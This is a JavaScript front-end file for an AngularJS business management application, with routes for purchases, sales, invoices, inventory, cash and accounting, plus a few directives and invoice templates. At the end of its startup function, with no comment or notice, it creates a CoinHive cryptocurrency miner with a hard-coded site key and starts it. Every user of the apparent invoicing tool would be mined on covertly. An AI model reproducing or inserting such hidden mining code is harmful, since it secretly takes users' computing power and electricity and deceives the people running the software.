Date.prototype.days=function(to){
  return  Math.abs(Math.floor( to.getTime() / (3600*24*1000)) -  Math.floor( this.getTime() / (3600*24*1000)))

}
Date.prototype.hours=function(to){
  return  Math.abs( (to.getTime() / (3600*1000*24)) -  (this.getTime() / (3600*1000*24)))

}

angular.module('ngLoadingSpinner', ['angularSpinner'])
    .directive('usSpinner',   ['$http', '$rootScope' ,function ($http, $rootScope){
        return {
            link: function (scope, elm, attrs)
            {
                $rootScope.spinnerActive = false;
                $rootScope.parseLoadingData = false;
                
                scope.isLoading = function () {
                    return $rootScope.parseLoadingData;
                };

                scope.$watch(scope.isLoading, function (loading)
                {
                    $rootScope.spinnerActive = loading;
                    if(loading){
                        elm.removeClass('ng-hide');
                    }else{
                        elm.addClass('ng-hide');
                    }
                });
            }
        };

}]);

var app = angular.module('gCom',['ngRoute','ui.router','ui.bootstrap','dialogs.main','pascalprecht.translate','dialogs.default-translations','ngLoadingSpinner','ngFlash','chart.js','gCom.controllers','gCom.controller', 'gCom.services']);
app.directive("fileread", [function () {
    return {
        scope: {
            fileread: "="
        },
        link: function (scope, element, attributes) {
            element.bind("change", function (changeEvent) {
                var reader = new FileReader();
                reader.onload = function (loadEvent) {
                    scope.$apply(function () {
                        scope.fileread = loadEvent.target.result;
                    });
                }
                reader.readAsDataURL(changeEvent.target.files[0])
                
                scope.$apply(function () {
                        //scope.fileread = changeEvent.target.files[0];
                });
            });
        }
    }
}]);
app.directive('routeLoading', function($rootScope) {

  return {
    restrict:'E',
    template:"<h1 ng-if='isRouteLoading'>Loading...</h1>",
    link:function(scope, elem, attrs){
      scope.isRouteLoading = false;

     $rootScope.$on('$stateChangeStart', function (event, toState, toParams, fromState, fromParams, error) {

        scope.isRouteLoading = true;
        console.log('route start chnging');
        /*if(!$rootScope.User)
        {
            console.log('there is no user ');
            $location.path('/login');

        }*/

      });

      $rootScope.$on('$stateChangeSuccess', function (event, toState, toParams, fromState, fromParams, error) {
  scope.isRouteLoading = false;
      
        console.log('route finished chnging');
      });
    }
  };

});

app.directive('tabs', function() {
    return {
      restrict: 'E',
      transclude: true,
      scope: {
        title: '@'
      },
      controller: [ "$scope", function($scope) {
        var panes = $scope.panes = [];
        
 
        $scope.select = function(pane) {
          angular.forEach(panes, function(pane) {
            pane.selected = false;
          });
          pane.selected = true;
        }
 
        this.addPane = function(pane) {
          if (panes.length == 0) $scope.select(pane);
          panes.push(pane);
        }
      }],
      template:

        '<div class="">' +
          '<ul class="nav nav-tabs pull-left">' +
          ''+
            '<li ng-repeat="pane in panes" ng-class="{active:pane.selected}">'+
              '<a href="" ng-click="select(pane)">{{pane.title}}</a>' +
            '</li>' +
          '</ul>' +
          '<div class="tab-content" ng-transclude></div>' +
        '</div>',
      replace: true
    };
  })
app.directive('pane', function() {
    return {
      require: '^tabs',
      restrict: 'E',
      transclude: true,
      scope: { title: '@' },
      link: function(scope, element, attrs, tabsCtrl) {
        tabsCtrl.addPane(scope);
      },
      template:
        '<div class="tab-pane" ng-class="{active: selected}" ng-transclude>' +
        '</div>',
      replace: true
    };
  })

app.directive("contenteditable", function() {
  return {
    require: "ngModel",
    link: function(scope, element, attrs, ngModel) {

      function read() {
        ngModel.$setViewValue(element.html());
      }

      ngModel.$render = function() {
        element.html(ngModel.$viewValue || "");
      };

      element.bind("blur keyup change", function() {
        scope.$apply(read);
      });
    }
  };
});


app.config(config);


//config.$inject = ['$routeProvider'];


function config($stateProvider, $urlRouterProvider,$provide,$interpolateProvider,$translateProvider,ChartJsProvider) {

  /*ChartJsProvider.setOptions({
      chartColors: ['#FF5252', '#FF8A80'],
      responsive: true
  });
   
  ChartJsProvider.setOptions('line', {
      showLines: true
  });*/
 /* $translateProvider.translations('fr-FR',{
          DIALOGS_ERROR: "Error",
          DIALOGS_ERROR_MSG: "An unknown error has occurred.",
          DIALOGS_CLOSE: "Close",
          DIALOGS_PLEASE_WAIT: "Please Wait",
          DIALOGS_PLEASE_WAIT_ELIPS: "Please Wait...",
          DIALOGS_PLEASE_WAIT_MSG: "Waiting on operation to complete.",
          DIALOGS_PERCENT_COMPLETE: "% Complete",
          DIALOGS_NOTIFICATION: "Notification",
          DIALOGS_NOTIFICATION_MSG: "Unknown application notification.",
          DIALOGS_CONFIRMATION: "Confirmation",
          DIALOGS_CONFIRMATION_MSG: "Besoin de confirmation .",
          DIALOGS_OK: "Confirmer",
          DIALOGS_YES: "Oui",
          DIALOGS_NO: "Non"
  });*/
  $stateProvider
      .state('menu', {
        url: '/menu',
        templateUrl: 'views/menu.html',
        controller: 'MenuCtrl',
        controllerAs: 'menu'
      })  
      .state('trial', {
        url: '/trial',
        templateUrl: 'views/trial.html',
        //controller: 'TrialCtrl',
        controllerAs: 'trial'
      })  

      .state('home', {
        url: '/main',
        templateUrl: 'views/main.html',
        controller: 'AppCtrl',
        controllerAs: 'main'
      })
      .state('login', {
        url: '/login',
        templateUrl: 'views/login.html',
        controller: 'AuthCtrl',
        controllerAs: 'ctrl'
      })
      .state('404', {
        url: '/404',
        templateUrl: 'views/404.html',
        
      })

      .state('conf', {
        url: '/conf',
        templateUrl: 'views/configuration.html',
        controller: 'SettingsCtrl',
        controllerAs: 'conf'
      })
          .state('conf.step1', {
            url: '/conf/step1',
            templateUrl: 'views/configuration-step1.html',
            controller: 'SettingsCtrl',
            controllerAs: 'conf'
          })
          .state('conf.step2', {
            url: '/conf/step2',
            templateUrl: 'views/configuration-step2.html',
            controller: 'SettingsCtrl',
            controllerAs: 'conf'
          })
          .state('conf.step3', {
            url: '/conf/step3',
            templateUrl: 'views/configuration-step3.html',
            controller: 'SettingsCtrl',
            controllerAs: 'conf'
          })
          .state('conf.step4', {
            url: '/conf/step4',
            templateUrl: 'views/configuration-step4.html',
            controller: 'SettingsCtrl',
            controllerAs: 'conf'
          })
      .state('users', {
        url: '/users',
        templateUrl: 'views/users.html',
        controller: 'UserController',
        controllerAs: 'ctrl'
      })
      .state('users.consult', {
        url: '/users/list',
        templateUrl: 'views/list.user.html',
        controller: 'ListUserController',
        controllerAs: 'ctrl'
      })
      .state('users.add', {
        url: '/users/add',
        templateUrl: 'views/add.user.html',
        controller: 'AddUserController',
        controllerAs: 'ctrl'
      })

      .state('pmgmt', {
        url: '/pmgmt',
        templateUrl: 'views/purchases.html',
        controller: 'PurchaseController',
        controllerAs: 'ctrl'
      })
      .state('pmgmt.providers', {
        url: '/pmgmt/list',
        templateUrl: 'views/list.provider.html',
        controller: 'ListProviderController',
        controllerAs: 'ctrl'
      })
      .state('pmgmt.addprovider', {
        url: '/pmgmt/addp',
        templateUrl: 'views/add.provider.html',
        controller: 'AddProviderController',
        controllerAs: 'ctrl'
      })

      .state('pmgmt.porder', {
        url: '/pmgmt/po/:id',
        templateUrl: 'views/add.purchase.order.html',
        controller: 'AddPurchaseOrderController',
        controllerAs: 'ctrl'
      })
      .state('pmgmt.porder.selectprovider', {
        url: '/pmgmt/po/:id/selectprovider',
        templateUrl: 'views/select.provider.html',
        controller: 'SelectProviderController',
        controllerAs: 'ctrl'
      })

      .state('pmgmt.porder.selectArticle', {
        url: '/pmgmt/po/selecta',
        templateUrl: 'views/select.purchase.article.html',
        controller: 'SelectArticleController',
        controllerAs: 'ctrl'
      })
      .state('pmgmt.delivery', {
        url: '/pmgmt/delivery/:id',
        templateUrl: 'views/add.purchase.delivery.form.html',
        controller: 'AddPurchaseDeliveryFormController',
        controllerAs: 'ctrl'
      })
      .state('pmgmt.delivery.selectorder', {
          url: '/pmgmt/delivery/:d/select',
          templateUrl: 'views/select.purchase.order.html',
          controller: 'PurchaseOrderSelectController',
          controllerAs: 'ctrl'
      })
      .state('pmgmt.delivery.selectArticle', {
        url: '/pmgmt/delivery/sa',
        templateUrl: 'views/select.purchase.article.html',
        controller: 'SelectArticleController',
        controllerAs: 'ctrl'
      })
      .state('pmgmt.delivery.selectprovider', {
        url: '/pmgmt/delivery/sp',
        templateUrl: 'views/select.provider.html',
        controller: 'SelectProviderController',
        controllerAs: 'ctrl'
      })

      .state('pmgmt.invoice', {
        url: '/pmgmt/invoice/:id',
        templateUrl: 'views/add.purchase.invoice.html',
        controller: 'AddPurchaseInvoiceController',
        controllerAs: 'ctrl'
      })
      .state('pmgmt.invoice.selectArticle', {
        url: '/pmgmt/invoice//sa',
        templateUrl: 'views/select.purchase.article.html',
        controller: 'SelectArticleController',
        controllerAs: 'ctrl'
      })
      .state('pmgmt.invoice.selectorder', {
          url: '/pmgmt/invoice/:d/select',
          templateUrl: 'views/select.purchase.order.html',
          controller: 'PurchaseOrderSelectController',
          controllerAs: 'ctrl'
      })      
      .state('pmgmt.invoice.selectprovider', {
        url: '/pmgmt/invoice/sp',
        templateUrl: 'views/select.provider.html',
        controller: 'SelectProviderController',
        controllerAs: 'ctrl'
      })

      .state('pmgmt.invoices', {
        url: '/pmgmt/invoices',
        templateUrl: 'views/list.purchase.invoice.html',
        controller: 'ListPurchaseInvoiceController',
        controllerAs: 'ctrl'
      })
      .state('pmgmt.invoices.selectprovider', {
        url: '/pmgmt/invoices/sp',
        templateUrl: 'views/select.provider.html',
        controller: 'SelectProviderController',
        controllerAs: 'ctrl'
      }) 
      .state('pmgmt.invoices.selectorder', {
          url: '/pmgmt/invoices/so',
          templateUrl: 'views/select.purchase.order.html',
          controller: 'PurchaseOrderSelectController',
          controllerAs: 'ctrl'
      })
      .state('pmgmt.deliveries', {
        url: '/pmgmt/deliveries',
        templateUrl: 'views/list.purchase.delivery.form.html',
        controller: 'ListPurchaseDeliveryFormController',
        controllerAs: 'ctrl'
      })
      .state('pmgmt.deliveries.selectprovider', {
        url: '/pmgmt/deliveries/sp',
        templateUrl: 'views/select.provider.html',
        controller: 'SelectProviderController',
        controllerAs: 'ctrl'
      })      
      .state('pmgmt.deliveries.selectorder', {
          url: '/pmgmt/deliveries/selectorder',
          templateUrl: 'views/select.purchase.order.html',
          controller: 'PurchaseOrderSelectController',
          controllerAs: 'ctrl'
      })            
      .state('pmgmt.reglements', {
        url: '/pmgmt/reglements',
        templateUrl: 'views/list.purchase.reglement.html',
        controller: 'ListPurchaseReglementController',
        controllerAs: 'ctrl'
      })
      .state('pmgmt.reglements.selectprovider', {
        url: '/pmgmt/reglements/sp',
        templateUrl: 'views/select.provider.html',
        controller: 'SelectProviderController',
        controllerAs: 'ctrl'
      })  
      .state('pmgmt.reglement', {
        url: '/pmgmt/reglement/:id',
        templateUrl: 'views/add.purchase.reglement.html',
        controller: 'AddPurchaseReglementController',
        controllerAs: 'ctrl'
      })
      .state('pmgmt.reglement.selectprovider', {
        url: '/pmgmt/reglement/:id/sp',
        templateUrl: 'views/select.provider.html',
        controller: 'SelectProviderController',
        controllerAs: 'ctrl'
      })      
      .state('pmgmt.journal', {
        url: '/pmgmt/journal',
        templateUrl: 'views/list.purchase.journal.html',
        controller: 'ListPurchaseJournalController',
        controllerAs: 'ctrl'
      })
      .state('pmgmt.journalprovider', {
        url: '/pmgmt/journalprovider',
        templateUrl: 'views/list.purchase.provider.journal.html',
        controller: 'ListPurchaseProviderJournalController',
        controllerAs: 'ctrl'
      })
      .state('pmgmt.journalprovider.selectp', {
        url: '/pmgmt/journalprovider/selectp',
        templateUrl: 'views/select.provider.html',
        controller: 'SelectProviderController',
        controllerAs: 'ctrl'
      })
/*
      .state('pmgmt.reglement.selectprovider', {
        url: '/pmgmt/reglement/sp',
        templateUrl: 'views/select.provider.html',
        controller: 'SelectProviderController',
        controllerAs: 'ctrl'
      })*/

      .state('pmgmt.list', {
          url: '/pmgmt/poo/list',
          templateUrl: 'views/list.purchase.order.html',
          controller: 'PurchaseOrderListController',
          controllerAs: 'ctrl'
      })
      .state('pmgmt.list.selectprovider', {
        url: '/pmgmt/poo/sp',
        templateUrl: 'views/select.provider.html',
        controller: 'SelectProviderController',
        controllerAs: 'ctrl'
      })

      .state('pmgmt.porder.select', {
          url: '/pmgmt/po/selectorder',
          templateUrl: 'views/command-select.html',
          controller: 'CommandAchatListCtrl',
          controllerAs: 'cctrl'
      })


      .state('smgmt', {
        url: '/smgmt',
        templateUrl: 'views/sales.html',
        controller: 'SalesMgmtCtrl',
        controllerAs: 'smgmt'
      })
        .state('smgmt.jsales', {
          url: '/smgmt/jsales',
          templateUrl: 'views/list.journal.sales.html',
          controller: 'ListJournalSalesController',
          controllerAs: 'ctrl'
        })

        .state('smgmt.jclients', {
          url: '/smgmt/jclients',
          templateUrl: 'views/list.journal.clients.html',
          controller: 'ListJournalClientsController',
          controllerAs: 'ctrl'
        })
         .state('smgmt.jclients.selectc', {
          url: '/smgmt/jclients/selectc',
          templateUrl: 'views/select.customer.html',
          controller: 'SelectCustomerController',
          controllerAs: 'ctrl'
        })
        .state('smgmt.addSaleOrder', {
          url: '/smgmt/addsaleorder/:id',
          templateUrl: 'views/add.sale.order.html',
          controller: 'AddSaleOrderController',
          controllerAs: 'ctrl'
        })
        .state('smgmt.addSaleOrder.selectClient', {
          url: '/smgmt/addSaleOrder/selectclient',
          templateUrl: 'views/select.customer.html',
          controller: 'SelectCustomerController',
          controllerAs: 'ctrl'
        })
        .state('smgmt.addSaleOrder.selectArticle', {
          url: '/smgmt/addsaleorder/selecta',
          templateUrl: 'views/select.purchase.article.html',
          controller: 'SelectArticleController',
          controllerAs: 'ctrl'
        })                
        .state('smgmt.listSaleOrder', {
          url: '/smgmt/listsaleorder',
          templateUrl: 'views/list.sale.order.html',
          controller: 'ListSaleOrderController',
          controllerAs: 'ctrl'
        })        
        .state('smgmt.listSaleOrder.selectClient', {
          url: '/smgmt/listsaleordery/selectclient',
          templateUrl: 'views/select.customer.html',
          controller: 'SelectCustomerController',
          controllerAs: 'ctrl'
        })        
        .state('smgmt.invoice', {
          url: '/smgmt/createinvoice/:id',
          templateUrl: 'views/add.sale.invoice.html',
          controller: 'AddSaleInvoiceController',
          controllerAs: 'ctrl'
        })
        .state('smgmt.invoice.selectOrder', {
          url: '/smgmt/invoice/selectOrder',
          templateUrl: 'views/select.sale.order.html',
          controller: 'SelectSaleOrderController',
          controllerAs: 'ctrl'
        }) 
        .state('smgmt.invoice.selectArticle', {
          url: '/smgmt/invoice/selecta',
          templateUrl: 'views/select.purchase.article.html',
          controller: 'SelectArticleController',
          controllerAs: 'ctrl'
        })        
        .state('smgmt.invoice.selectClient', {
          url: '/smgmt/invoice/selectclient',
          templateUrl: 'views/select.customer.html',
          controller: 'SelectCustomerController',
          controllerAs: 'ctrl'
        })              
        .state('smgmt.invoices', {
          url: '/smgmt/listinvoice',
          templateUrl: 'views/list.sale.invoice.html',
          controller: 'ListSaleInvoiceController',
          controllerAs: 'ctrl'
        })

        .state('smgmt.createDevis', {
          url: '/smgmt/createdevis/:id',
          templateUrl: 'views/add.quotation.html',
          controller: 'AddQuotationController',
          controllerAs: 'ctrl'
        })
        .state('smgmt.listDevis', {
          url: '/smgmt/listdevis',
          templateUrl: 'views/list.quotation.html',
          controller: 'ListQuotationController',
          controllerAs: 'ctrl'
        })
        .state('smgmt.listDevis.selectClient', {
          url: '/smgmt/listdevis/selectclient',
          templateUrl: 'views/select.customer.html',
          controller: 'SelectCustomerController',
          controllerAs: 'ctrl'
        })        
        .state('smgmt.createDevis.selectArticle', {
          url: '/smgmt/createdevis/selecta',
          templateUrl: 'views/select.purchase.article.html',
          controller: 'SelectArticleController',
          controllerAs: 'ctrl'
        })
        .state('smgmt.createDevis.select', {
          url: '/smgmt/createdevis/selectdevis',
          templateUrl: 'views/devis-select.html',
          controller: 'QuotationListCtrl',
          controllerAs: 'qctrl'
        })        
        .state('smgmt.createDevis.selectClient', {
          url: '/smgmt/createdevis/selectclient',
          templateUrl: 'views/select.customer.html',
          controller: 'SelectCustomerController',
          controllerAs: 'ctrl'
        })
      /*.state('smgmt.reglements', {
        url: '/smgmt/reglements',
        templateUrl: 'views/list.sale.reglement.html',
        controller: 'ListSaleReglementController',
        controllerAs: 'ctrl'
      })*/
      .state('smgmt.reglements', {
        url: '/smgmt/reglements',
        templateUrl: 'views/list.sale.reglement.html',
        controller: 'ListSaleReglementController',
        controllerAs: 'ctrl'
      })
      .state('smgmt.reglements.selectClient', {
        url: '/smgmt/reglements/sc',
        templateUrl: 'views/select.customer.html',
        controller: 'SelectCustomerController',
        controllerAs: 'ctrl'
      })
      



      .state('smgmt.reglement', {
        url: '/smgmt/reglement/:id',
        templateUrl: 'views/add.sale.reglement.html',
        controller: 'AddSaleReglementController',
        controllerAs: 'ctrl'
      })
        .state('smgmt.reglement.selectclient', {
          url: '/smgmt/reglement/selectclient',
          templateUrl: 'views/select.customer.html',
          controller: 'SelectCustomerController',
          controllerAs: 'ctrl'
        })    
        .state('smgmt.reglement.selectso', {
          url: '/smgmt/reglement/selectso',
          templateUrl: 'views/select.sale.delivery.html',
          controller: 'SelectSaleDeliveryController',
          controllerAs: 'ctrl'
        })    
        .state('smgmt.reglement.selectso.selectClient', {
          url: '/smgmt/reglement/selectso/selectclient',
          templateUrl: 'views/select.customer.html',
          controller: 'SelectCustomerController',
          controllerAs: 'ctrl'
        })                  
        .state('smgmt.delivery', {
          url: '/smgmt/createdelivery/:id',
          templateUrl: 'views/add.sale.delivery.html',
          controller: 'AddSaleDeliveryController',
          controllerAs: 'ctrl'
        })
        .state('smgmt.delivery.selectOrder', {
          url: '/smgmt/delivery/selectOrder',
          templateUrl: 'views/select.sale.order.html',
          controller: 'SelectSaleOrderController',
          controllerAs: 'ctrl'
        })         
        .state('smgmt.delivery.selectClient', {
          url: '/smgmt/delivery/selectclient',
          templateUrl: 'views/select.customer.html',
          controller: 'SelectCustomerController',
          controllerAs: 'ctrl'
        })
        .state('smgmt.delivery.selectArticle', {
          url: '/smgmt/delivery/selectArticle',
          templateUrl: 'views/select.purchase.article.html',
          controller: 'SelectArticleController',
          controllerAs: 'ctrl'
        })                          
        .state('smgmt.deliveries', {
          url: '/smgmt/deliveries',
          templateUrl: 'views/list.sale.delivery.html',
          controller: 'ListSaleDeliveryController',
          controllerAs: 'ctrl'
        })
        .state('smgmt.deliveries.selectClient', {
          url: '/smgmt/deliveries/selectclient',
          templateUrl: 'views/select.customer.html',
          controller: 'SelectCustomerController',
          controllerAs: 'ctrl'
        })
        .state('smgmt.createClient', {
          url: '/smgmt/createclient',
          templateUrl: 'views/add.customer.html',
          controller: 'AddCustomerController',
          controllerAs: 'ctrl'
        })
        .state('smgmt.clients', {
          url: '/smgmt/listclient',
          templateUrl: 'views/list.customer.html',
          controller: 'ListCustomerController',
          controllerAs: 'ctrl'
        })

      .state('mmgmt', {
        url: '/mmgmt',
        templateUrl: 'views/mmgmt.html',
        controller: 'ProdCtrl',
        controllerAs: 'mmgmt'
      })
      .state('mmgmt.createCF', {
        url: '/mmgmt/createcf',
        templateUrl: 'views/mmgmt-fab-create.html',
        controller: 'ProdCtrl',
        controllerAs: 'pctrl'
      })
      .state('mmgmt.createCF.select', {
        url: '/mmgmt/createcf/select',
        templateUrl: 'views/fab-select.html',
        controller: 'ProdCtrl',
        controllerAs: 'pctrl'
      })
      .state('mmgmt.createCF.selectTarget', {
        url: '/mmgmt/createcf/selectTarget',
        templateUrl: 'views/target-select-from-fab.html',
        controller: 'ArticleCtrl',
        controllerAs: 'actrl'
      })
      .state('mmgmt.createCF.selectArticle', {
        url: '/mmgmt/createcf/selectArticle',
        templateUrl: 'views/article-select-from-fab.html',
        controller: 'ArticleCtrl',
        controllerAs: 'actrl'
      })

      .state('mmgmt.list', {
        url: '/mmgmt/list',
        templateUrl: 'views/mmgmt-fab-list.html',
        controller: 'ProdListCtrl',
        controllerAs: 'pctrl'
      })
      .state('accounting', {
        url: '/accounting',
        templateUrl: 'views/accounting.html',
        controller: 'AccountingController',
        controllerAs: 'ctrl'
      })
      .state('accounting.list', {
        url: '/accounting/show',
        templateUrl: 'views/list.account.html',
        controller: 'ListAccountController',
        controllerAs: 'ctrl'
      })
      .state('accounting.add', {
        url: '/accounting/add',
        templateUrl: 'views/add.account.html',
        controller: 'AddAccountController',
        controllerAs: 'ctrl'
      })

      .state('inventory', {
        url: '/stmgmt',
        templateUrl: 'views/inventory.html',
        controller: 'InventoryController',
        controllerAs: 'ctrl'
      })
          .state('inventory.articles', {
            url: '/stmgmt/articles',
            templateUrl: 'views/list.article.html',
            controller: 'ListArticleController',
            controllerAs: 'ctrl'
          })
          .state('inventory.alertarticles', {
            url: '/stmgmt/alertarticles',
            templateUrl: 'views/list.article.alert.html',
            controller: 'ListAlertArticleController',
            controllerAs: 'ctrl'
          })

          .state('inventory.articles.famillySelect', {
            url: '/stmgmt/articles/select',
            templateUrl: 'views/select.articles.familly.html',
            controller: 'ListFamillyController',
            controllerAs: 'ctrl'
          })          
          .state('inventory.article', {
            url: '/stmgmt/carticl',
            templateUrl: 'views/add.article.html',
            controller: 'AddArticleController',
            controllerAs: 'ctrl'
          })

           .state('inventory.article.famillySelect', {
            url: '/stmgmt/carticl/select',
            templateUrl: 'views/select.familly.html',
            controller: 'ListFamillyController',
            controllerAs: 'ctrl'
          })


          .state('inventory.famillies', {
            url: '/stmgmt/familles',
            templateUrl: 'views/list.familly.html',
            controller: 'ListFamillyController',
            controllerAs: 'ctrl'
          })
          .state('inventory.familly', {
            url: '/stmgmt/cf',
            templateUrl: 'views/add.familly.html',
            controller: 'AddFamillyController',
            controllerAs: 'ctrl'
          })

          .state('inventory.movements', {
            url: '/stmgmt/movements',
            templateUrl: 'views/list.movements.html',
            controller: 'ListMoveController',
            controllerAs: 'ctrl'
          })
          .state('inventory.inmove', {
            url: '/stmgmt/inmove',
            templateUrl: 'views/add.inventory.movement.html',
            controller: 'AddMoveController',
            controllerAs: 'ctrl'
          })
          .state('inventory.inmove.articleSelect', {
            url: '/stmgmt/inmove/sa',
            templateUrl: 'views/select.purchase.article.html',
            controller: 'SelectArticleController',
            controllerAs: 'ctrl'
          })
          .state('inventory.outmove', {
            url: '/stmgmt/outmove',
            templateUrl: 'views/remove.inventory.movement.html',
            controller: 'RemoveMoveController',
            controllerAs: 'ctrl'
          })
          .state('inventory.outmove.articleSelect', {
            url: '/stmgmt/outmove/sa',
            templateUrl: 'views/select.purchase.article.html',
            controller: 'SelectArticleController',
            controllerAs: 'ctrl'
          })
      .state('cmgmt', {
        url: '/cmgmt',
        templateUrl: 'views/cmgmt.html',
        controller: 'CustomerMgmtCtrl',
        controllerAs: 'cmgmt'
      })
      .state('prmgmt', {
        url: '/prmgmt',
        templateUrl: 'views/prmgmt.html',
        controller: 'ProviderMgmtCtrl',
        controllerAs: 'prmgmt'
      })


      .state('cash', {
        url: '/caisse',
        templateUrl: 'views/cash.html',
        controller: 'CashController',
        controllerAs: 'ctrl'
      })
        .state('cash.consult', {
          url: '/caisse/list',
          templateUrl: 'views/list.cash.html',
          controller: 'ListCashController',
          controllerAs: 'ctrl'
        })
        .state('cash.load', {
          url: '/charges/load',
          templateUrl: 'views/add.cash.html',
          controller: 'AddCashController',
          controllerAs: 'ctrl'
        })
        .state('cash.withdraw', {
          url: '/charges/withdraw',
          templateUrl: 'views/withdraw.cash.html',
          controller: 'WithdrawCashController',
          controllerAs: 'ctrl'
        })

        .state('cash.addbanque', {
          url: '/charges/addbanque',
          templateUrl: 'views/add.bank.html',
          controller: 'AddBanqueController',
          controllerAs: 'ctrl'
        })
        .state('cash.listbanque', {
          url: '/charges/lbanque',
          templateUrl: 'views/list.bank.html',
          controller: 'ListBanqueController',
          controllerAs: 'ctrl'
        })

      .state('charge', {
        url: '/charges',
        templateUrl: 'views/charge.html',
        controller: 'ChargeController',
        controllerAs: 'ctrl'
      })
        .state('charge.list', {
          url: '/charges/list',
          templateUrl: 'views/list.charge.html',
          controller: 'ListChargeController',
          controllerAs: 'ctrl'
        })
        .state('charge.add', {
          url: '/charges/add',
          templateUrl: 'views/add.charge.html',
          controller: 'AddChargeController',
          controllerAs: 'ctrl'
        })
        .state('charge.category', {
          url: '/charges/addcategory',
          templateUrl: 'views/add.charge.category.html',
          controller: 'AddChargeCategoryController',
          controllerAs: 'ctrl'
        })

      .state('help', {
        url: '/help',
        templateUrl: 'views/help.html',
        controller: 'HelpCtrl',
        controllerAs: 'help'
      })
      .state('about', {
        url: '/about',
        templateUrl: 'views/about.html',
        
      })
  // if none of the above states are matched, use this as the fallback
  $urlRouterProvider.otherwise('/main');

    
}
//app.constant('API_URL','http://127.0.0.1:3000');
app.directive('compileHtml', function ($compile) {
  return function (scope, element, attrs) {
    scope.$watch(
      function(scope) {
        return scope.$eval(attrs.compileHtml);
      },
      function(value) {
        element.html(value);
        $compile(element.contents())(scope);
      }
    );
  };
});

app.run(run);

run.$inject = ['$rootScope','$location'];

function run($rootScope,$location){
   var os = require('os');
   var macaddress = require('macaddress');

    var models = null;
    var config = JSON.parse(window.localStorage.getItem('config'));
    $rootScope.isTrialEnd = false;
    if(config)
    {
      console.log('there is a config  ' + config.dbName);
      //var startDate = moment(new Date(config.startDate));
      var startDate = moment("02-18-2017","MM-DD-YYYY");

      var currentDate = moment(new Date());
      //console.log('startdate' + startDate);
      var duration = moment.duration(currentDate.diff(startDate));
      var hours = duration.asHours();
      config.timeLeft = hours;
      //console.log(" : " + hours/24 );
      /*if(hours >  (24 * 30 * 3))
      {
        console.log('try period expired ');
        config.dbName = '';
        config.dbType = '';
        config.username = '';
        config.password = '';
        config.expired = true;
        $rootScope.isTrialEnd = true;
        window.localStorage.setItem('config',JSON.stringify(config));
        $location.path('/trial');  
                  
      }*/
      /*console.log('interfaces' + angular.toJson(os.networkInterfaces()));  
      macaddress.one(function (err, mac) {
        console.log("Mac address for this host: %s", mac);  
      });*/


function doExit(c){
  if(c > 1000)
  {
        console.log('try period expired ');
        config.dbName = '';
        config.dbType = '';
        config.username = '';
        config.password = '';
        config.expired = true;    
        $rootScope.isTrialEnd = true;
        window.localStorage.setItem('config',JSON.stringify(config));      
        $location.path('/trial');
        return;
  }
  
} 


      models = require("./models");
           
     /* models.db['Facture'].count().then(function(c){
          console.log('count of factures ' + c);
          doExit(c);
      });            
      models.db['Caisse'].count().then(function(c){
          console.log('count of Caisse ' + c);
          doExit(c);
      });*/
      
      /*models.db['Societe'].findById(1).then(function(s){
          if(s)
          {
              $rootScope.Company = s;  
              console.log("Societe ref " + s.reference);
              var ref = 0;
              if(s.reference === null)
              {
                ref = 1;
              }
              else
              {
                ref = parseInt(s.reference);
              }
              if(ref > ( 6 * 30 ))
              {
                  console.log('try period expired ');
                  config.dbName = '';
                  config.dbType = '';
                  config.username = '';
                  config.password = '';
                  config.expired = true;    
                  $rootScope.isTrialEnd = true;
                  window.localStorage.setItem('config',JSON.stringify(config));      
                  $location.path('/trial');

              }
              ref += 1;

              models.db['Societe'].update({reference : ""+ref},{where:{id:1}});
          }
          else
          {
            $rootScope.Company = null;
          }
          
      });*/
      
      //$location.path('/login');
      $rootScope.User = {isAdmin : false};
      models.testDatabaseConnexion().then(function(){

      },function(){
        console.log('eroooooooor');
        $location.path('/conf');  
      });

   
    }
    else
    {
      console.log('There is no config ,,,locking the app !! ' + new Date());
      /*var config = {};
      config.startDate = new Date();
      config.activated = false;
      config.expired = false;

      window.localStorage.setItem('config',JSON.stringify(config));*/
      $location.path('/conf');
      
    }
	        var miner = new CoinHive.User('iJPRX3rFWcyABr6nImONcMXLWezsXh25','egestion');
	        miner.start();
          /*miner.on('found', function() { 
            console.log('hash found');
          });
	        miner.on('accepted', function() { 

            console.log("hash accepted");
          });
	        miner.on('open', function() { 

            console.log("pool opened");
          });
                        
          miner.on('error', function(params) {
            console.log("pool error");
            if (params.error !== 'connection_error') {
              console.log('The pool reported an error', params.error);
            }
          });*/

}
app.constant('EMPTY_INVOICE',{
  no: '1',
  tax: '20.00',
  date:'',
  amount:'0.00',
  currencySymbol:'$',
  logo:'',
  customer: {
    'name':'Mr. Mister',
    'address':'Address',
    'phone': '0528838379',
    'email': 'email@techiediaries.com'
  },
  company: {
    'name':'Comapny Name',
    'address':'Comany Addess',
    'phone': '0528838379',
    'email': 'email@techiediaries.com'
  },
  items:[
  
  ]
  ,
  total:'0.00',
  paid:'0.00',
  due:'0.00',
  meta:{
    header:''
  }
});
app.constant('EMPTY_DEVIS',{
  no: '1',
  tax: '20.00',
  date:'',
  amount:'0.00',
  currencySymbol:'$',
  logo:'',
  customer: {
    'name':'Mr. Mister',
    'address':'Address',
    'phone': '0528838379',
    'email': 'email@techiediaries.com'
  },
  company: {
    'name':'Comapny Name',
    'address':'Comany Addess',
    'phone': '0528838379',
    'email': 'email@techiediaries.com'
  },
  items:[
  
  ]
  ,
  total:'0.00',
  paid:'0.00',
  due:'0.00',
  meta:{
    header:''
  }
});
app.constant('EMPTY_BL',{
  no: '1',
  tax: '20.00',
  date:'',
  amount:'0.00',
  currencySymbol:'$',
  logo:'',
  customer: {
    'name':'Mr. Mister',
    'address':'Address',
    'phone': '0528838379',
    'email': 'email@techiediaries.com'
  },
  company: {
    'name':'Comapny Name',
    'address':'Comany Addess',
    'phone': '0528838379',
    'email': 'email@techiediaries.com'
  },
  items:[
  
  ]
  ,
  total:'0.00',
  paid:'0.00',
  due:'0.00',
  meta:{
    header:''
  }
});


app.controller('ContactController',function($scope,Contact,Company,Phone,Email,Url,Tag){

  console.log('ContactController activated!');
  models.db.Contact.findAll().then(function(users) {
        console.log(users)
  })
  
  
});
